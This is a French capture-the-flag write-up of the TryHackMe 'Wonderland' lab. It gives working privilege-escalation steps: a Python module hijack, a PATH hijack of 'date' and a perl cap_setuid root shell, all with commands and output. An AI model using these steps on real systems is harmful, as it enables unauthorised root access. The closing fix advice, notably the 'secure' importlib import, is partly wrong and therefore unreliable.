# Wonderland 
lien : https://tryhackme.com/room/wonderland
## NMAP 

```bash
$ nmap -sC -sV -oA nmap/initialScan 10.10.209.89
# Nmap 7.93 scan initiated Fri Mar  3 05:34:33 2023 as: nmap -sC -sV -oA nmap/initialScan 10.10.209.89
Nmap scan report for 10.10.209.89
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8eeefb96cead70dd05a93b0db071b863 (RSA)
|   256 7a927944164f204350a9a847e2c2be84 (ECDSA)
|_  256 000b8044e63d4b6947922c55147e2ac9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  3 05:34:52 2023 -- 1 IP address (1 host up) scanned in 18.40 seconds
```

---
## GOBUSTER
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.209.89/ -o gobuster/GobusterMedium -x html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.89/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
2023/03/03 05:51:24 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
```
**/img** contient des images, nous allons les télécharger et les analyser:

---
### WGET
```bash
┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
└─$ wget -r --no-parent http://10.10.209.89/img/
```

Le dossier contient 3 images :

```bash
┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
└─$ mv 10.10.209.89 img
┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
└─$ tree                
.
└── img
    ├── alice_door.jpg
    ├── alice_door.png
    ├── index.html
    └── white_rabbit_1.jpg

2 directories, 4 files
```


### STEGHIDE
**steghide** ne renvoie rien d'intéressant des images 'alice_door.jpg' et 'alice_door.png'
```bash
┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
└─$ steghide extract -sf img/white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".
                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
└─$ cat hint.txt      
follow the r a b b i t 
```

**steghide** vient d'extraire la phrase suivante : '**follow the r a b b i t**'
Il y a un espace entre chaque lettre de rabbit, pourquoi ?
Rappelez-vous, nous avons un chemin '**/r**' dans notre sortie de gobuster, on va essayer d'acceder au chemain suivant /r/a/b/b/i/t/

```bash
$ curl http://10.10.142.253/r/a/b/b/i/t/ 
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:**************************</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```
On voit qu'il y a un paragraphe caché sur la page html, qui contient une information qui pourrait bien ressembler à des identifiants.
Nous allons essayer de nous connecter en **ssh** puisque le port 22 est ouvert:

```bash
$ ssh alice@10.10.142.253
The authenticity of host '10.10.142.253 (10.10.142.253)' can't be established.
ED25519 key fingerprint is SHA256:*********************************
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.142.253' (ED25519) to the list of known hosts.
alice@10.10.142.253's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  3 15:15:17 UTC 2023

  System load:  0.08               Processes:           83
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 27%                IP address for eth0: 10.10.142.253
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

```

---
## USER FLAG
```bash
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt 
cat: root.txt: Permission denied
```

Le flag de l'utilisateur root se trouve dans **/home/alice**, du coup je me demande si le **user.txt** flag se trouve dans **/root/**:

```bash
$ cat /root/user.flag
thm{"**************"}
```

Bien, nous venons de trouver le flag de **user**!

---
La commande ```sudo -l``` permet de lister les privilèges qu'un utilisateur possède avec 'sudo' :

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

````

Affichons le script **'/home/alice/walrus_and_the_carpenter.py**':
```python
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
...SNIPPED...
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
Ce script génère 10 lignes aléatoires extraites du poème "The Walrus and the Carpenter" de Lewis Carroll en utilisant le module "random" de Python.
La première partie du script définit une chaîne de caractères qui contient le poème complet sous la variable poem. Le poème est ensuite divisé en lignes en utilisant la méthode split("\n"), qui retourne une liste de toutes les lignes.
Ensuite, une boucle for est utilisée pour itérer 10 fois. À chaque itération, une ligne aléatoire est choisie à partir de la liste de lignes en utilisant la fonction random.choice(), et est stockée dans la variable line. La ligne sélectionnée est ensuite imprimée à l'écran avec le préfixe "The line was:" en utilisant la fonction print().

Le script **walrus_and_the_carpenter.py** importe le module **random**, on va créer un fichier **random.py** pour voir si le script charge notre module perso **random.py** lors de l'excecution du script:

On créé un fichier **random.py** dans **/home/alice/** :
```python3
import os

os.system("/bin/bash")
```

On lance le script : 
```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Resultat :
```bash
rabbit@wonderland:~$ id                                                                                             
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit) 
```

Bien! Nous sommes connectés maintenant avec l'utilisateur **'rabbit'**.

Vérifions les fichiers qui ont le bit SETUID activé avec la commande ```find / -perm -u=s -type f 2>/dev/null```  à partir de la racine "/".

Le bit SETUID est un attribut de fichier qui permet à un utilisateur d'exécuter un programme avec les mêmes privilèges que le propriétaire du fichier. Cela peut être utile pour les programmes qui nécessitent des privilèges élevés pour fonctionner correctement.

En résumé, cette commande est utile pour identifier les fichiers qui ont le bit SETUID activé, ce qui peut aider à identifier les vulnérabilités potentielles de sécurité sur un système.

```bash
rabbit@wonderland:~$ find / -perm -u=s -type f 2>/dev/null
/home/rabbit/teaParty
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su

```
Le fichier **'/home/rabbit/teaParty'** à le bit SETUID activé, nous allons essayer de télécharger et analyser ce fichier :

Nous pouvons télécharger le fichier binaire à l'aide du module http.server de python3 :

- Target : ```python3 -m http.server 9090```

- Kali: ```wget http://10.10.209.89:9090/teaParty ```

Analyse avec **strings** du binaire  **teaParty** :

```bash
$ strings teaParty                                                                                                                                                                                                                                                                                      
...SNIPPED...
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
...SNIPPED...
```
En examinant le fichier **teaParty** nous voyons que '**date**' est exécuté sans spécifier de chemin absolu.
On va donc créer un fichier '**date**' dans '**/tmp/date**' et changer le **PATH** pour que teaParty utilise notre fichier **date** personnalisé:
- Création du fichier date avec la commande ```nano /tmp/date``` :
```bash
#!/bin/bash
echo ""
echo "Test Date Hijacked"
/bin/bash
~
```

- Changement de notre PATH avec la commande ```export PATH=/tmp:$PATH```

On peut maintenant lancer le binaire teaParty avec la commande ```./teaParty```:
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by
Test Date Hijacked

hatter@wonderland:/home/rabbit$ whoami
hatter
```

Bien, nous avons élevé nos privilèges, nous utilisons maintenant l'utilisateur **'hatter'**.
Nous pouvons donc nous rendre dans **/home/hatter** et afficher le password:
```bash
hatter@wonderland:/home/hatter$ cat password.txt 
***************
```

Nous faisons notre énumération standard en utilisant **linPEAS** :
## LINPEAS
```bash
...SNIPPED...
╔══════════╣ Capabilities                                                                                                                                                               │  File "/usr/lib/python3.11/http/server.py", line 674, in do_GET
                                                                                                                                                                                                                     │    self.copyfile(f, self.wfile)
Files with capabilities (limited to 50):                                                                                                                                                                             │  File "/usr/lib/python3.11/http/server.py", line 873, in copyfile
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                                                                                                                                  │    shutil.copyfileobj(source, outputfile)
/usr/bin/mtr-packet = cap_net_raw+ep                                                                                                                                                                                 │  File "/usr/lib/python3.11/shutil.py", line 200, in copyfileobj
/usr/bin/perl = cap_setuid+ep    
...SNIPPED...


```

Nous voyons que **/usr/bin/perl** a des capacités **cap_setuid+ep**.
Nous pouvons lancer la commande suivante pour devenir root:
```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
hatter@wonderland:~$ whoami;id
root
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Enfin, nous pouvons afficher le contenu du flag **/home/alice/root.txt**:
```bash
# cat /home/alice/root.txt
thm{********************}
```


---
## FIX

#### 1. Éviter de cacher des informations sensibles dans des images.


#### 2. Modifier le script python **walrus_and_the_carpenter.py** :
Pour importer le module **random** de manière sécurisée dans votre script Python, vous pouvez utiliser l'approche suivante:
- Utilisez le module **importlib** pour importer le module **random** de manière dynamique et sécurisée, en utilisant la fonction import_module.
- Utilisez un alias pour le module random, pour éviter les conflits de noms avec des variables ou des fonctions dans votre script.

Voici un exemple de code pour importer **random** de manière sécurisée:
```python

import importlib

try:
    random = importlib.import_module('random')
except ImportError:
    raise ImportError('Le module "random" ne peut pas être importé')

# Utilisez l'alias "rand" pour éviter les conflits de noms
rand = random.Random()
```
>Ce code importe random de manière sécurisée, en utilisant la fonction import_module du module importlib. 
Si l'importation échoue, une erreur ImportError est levée avec un message explicatif. 
Ensuite, un alias rand est créé pour le module random. 
Cet alias peut être utilisé pour accéder aux fonctions et méthodes du module random dans votre script.


#### 3. Fichier teaParty :
- Utiliser le chemin complet pour utiliser **date**:
	changer la commande dans teaParty :
	``` /bin/echo -n 'Probably by ' && date --date='next hour' -R``` 
	avec :
	``` /bin/echo -n 'Probably by ' && /usr/bin/date --date='next hour' -R``` 
- Changer les permissions du fichier **teaParty**
```sudo chmod 600 teaParty```


#### 4. Changer les capacités UID
Pour rendre les fichiers exécutables **cap_setuid** et **cap_net_raw**  uniquement par l'utilisateur **root**, utilisez la commande suivante:

```bash
sudo setcap -r /usr/bin/perl5.26.1
sudo setcap -r /usr/bin/mtr-packet
sudo setcap -r /usr/bin/perl
```
La commande **setcap** est utilisée pour définir ou supprimer les capacités de sécurité d'un fichier. L'option -r est utilisée pour supprimer toutes les capacités de sécurité d'un fichier. En exécutant ces commandes avec les privilèges de superutilisateur (sudo), vous pouvez retirer les capacités de sécurité et restreindre l'accès à ces fichiers uniquement à l'utilisateur root.

